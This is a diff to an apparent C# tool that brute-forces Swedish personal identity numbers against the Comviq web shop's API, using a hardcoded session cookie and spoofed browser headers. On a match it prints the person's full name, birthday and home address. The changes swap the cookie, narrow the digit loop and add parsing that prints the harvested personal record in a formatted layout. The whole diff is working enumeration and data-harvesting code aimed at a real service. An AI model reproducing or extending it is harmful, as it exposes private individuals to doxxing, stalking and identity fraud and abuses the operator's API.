@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Web.Script.Serialization;
 
 namespace PN_Comviq
 {
@@ -31,7 +32,7 @@ namespace PN_Comviq
             request.Host = "webbutik.comviq.se";
             request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
             request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246";
-            request.Headers.Add("Cookie", "frontend=1d9c44f11797746ae05e993b3d713f0d;");
+            request.Headers.Add("Cookie", "frontend=a972a1188c10f056e65cae46d387e234;");
             request.Headers.Add("X-Requested-With", "XMLHttpRequest");
             request.Headers.Add("Accept-Language", "en-GB,en;q=0.9,ar-SY;q=0.8,ar;q=0.7,sv-SE;q=0.6,sv;q=0.5,en-US;q=0.4");
 
@@ -104,6 +105,8 @@ namespace PN_Comviq
             Console.WriteLine("What Gender? (1 For Men, 0 For Women)");
             int gender = int.Parse(Console.ReadLine());
 
+            var serializer = new JavaScriptSerializer();
+            
             try
             {
                 Console.Write("Brute forcing SSN... ");
@@ -112,7 +115,7 @@ namespace PN_Comviq
                 using (var progress = new ProgressBar())
                 {
                     //1st digit loop (random)
-                    for (int i = 0; i <= 9; i++)
+                    for (int i = 8; i <= 9; i++)
                     {
                         //2nd digit loop (random)
                         for (int j = 0; j <= 9; j++)
@@ -138,10 +141,24 @@ namespace PN_Comviq
                                     //dispose the progressbar
                                     progress.Dispose();
 
-                                    //print persons info
+                                    //print person info
                                     Console.ForegroundColor = ConsoleColor.Green;
-                                    Console.WriteLine($"[FOUND!!][{ssn.Insert(8, "-")}] Message: Found Matched Results!");
-                                    Console.WriteLine(apiResponse);
+                                    Console.WriteLine($"\r\n");
+
+                                    //Deserialize response form the api
+                                    ResponseData rd = serializer.Deserialize<ResponseData>(apiResponse);
+
+                                    //print out the data
+                                    Console.WriteLine("============== FOUND ===============");
+                                    Console.WriteLine("Personnummer: " + rd.ssnInfo.identificationNumber.Insert(8, "-"));
+                                    Console.WriteLine("====================================");
+                                    Console.WriteLine("First Name  : " + rd.ssnInfo.firstName);
+                                    Console.WriteLine("Last Name   : " + rd.ssnInfo.lastName);
+                                    Console.WriteLine("Birthday    : " + rd.ssnInfo.birthday);
+                                    Console.WriteLine("====================================");
+                                    Console.WriteLine("City        : " + rd.ssnInfo.address.city);
+                                    Console.WriteLine("Address     : " + rd.ssnInfo.address.streetAddress);
+                                    Console.WriteLine("Postal Code : " + rd.ssnInfo.address.postalCode);
 
                                     //use goto to break from nested loop when match found
                                     goto done;
